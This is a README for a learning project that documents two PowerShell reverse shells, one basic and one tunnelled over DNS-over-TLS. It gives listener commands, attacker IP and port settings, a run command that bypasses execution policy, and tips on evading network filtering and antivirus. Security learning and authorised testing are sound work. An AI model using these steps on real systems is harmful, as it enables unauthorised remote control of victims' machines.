# PowerShell Reverse Shell

This project is a learning exercise inspired by [Martin Sohn's PowerShell Reverse Shell](https://github.com/martinsohn/PowerShell-reverse-shell). It demonstrates two variations of a reverse shell implemented in PowerShell:

1. A **basic reverse shell**.
2. An **advanced reverse shell** utilizing DNS-over-TLS (DoT) for a more secure connection with the server.

## Disclaimer

**Warning:** This project is strictly for educational purposes. Unauthorized use against systems without explicit permission is illegal and unethical. Always obtain proper authorization before deploying this tool.

## Features

### Basic Reverse Shell

- Establishes a reverse TCP connection to a specified IP and port.
- Executes commands from the remote server and returns output.

### Secure Reverse Shell (DNS-over-TLS)

- Utilizes DNS-over-TLS (DoT) for a more secure communication channel.
- Hides traffic in DNS queries to bypass some network-level filtering.

## Requirements

- **Operating System:** Windows with PowerShell installed.
- **Network:** Ability to connect to the remote server.
- For the DNS-over-TLS version:
  - DNS server configured for DoT communication.

## Usage

### Basic Reverse Shell

1. **Set Up the Listener on the Remote Server:**

   - Use a tool like Netcat to listen for incoming connections:

     ```bash
     nc -lvnp [PORT]
     ```

   - Replace `[PORT]` with the port number you intend to use.

2. **Configure the Script:**

   - Set the `$remoteIP` and `$remotePort` variables in the script:

     ```powershell
     $remoteIP = "[REMOTE_IP]"
     $remotePort = [PORT]
     ```

   - Replace `[REMOTE_IP]` and `[PORT]` with the appropriate values.

3. **Execute the Script:**

   - Run the PowerShell script:

     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\powershell-reverseshell.ps1
     ```

### Secure Reverse Shell (DNS-over-TLS)

1. **Set Up a Secure Listener:**

   - Use Ncat (from the Nmap suite) to listen for incoming SSL connections (You can also use netcat which has an unmodifiable buffer of 4096 bytes):

     ```bash
     ncat --ssl -lnvp [PORT_NUMBER]
     ```

   - Replace `[PORT_NUMBER]` with the port number you intend to use.

2. **Execute the Script:**

   - Run the secure reverse shell:

     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\powershell-reverseshell-dns-tls.ps1
     ```

## Security Considerations

- **Antivirus Detection:** Both scripts may trigger antivirus software. Adjustments or obfuscations might be necessary for testing in controlled environments.
- **Ethical Use:** Deploy these tools only on systems where you have explicit permission for penetration testing.

## Acknowledgments

This project is inspired by [Martin Sohn's PowerShell Reverse Shell](https://github.com/martinsohn/PowerShell-reverse-shell). Special thanks to the original creator for providing a solid foundation.

## License

This project is licensed under the [GPL-3.0 License](LICENSE).
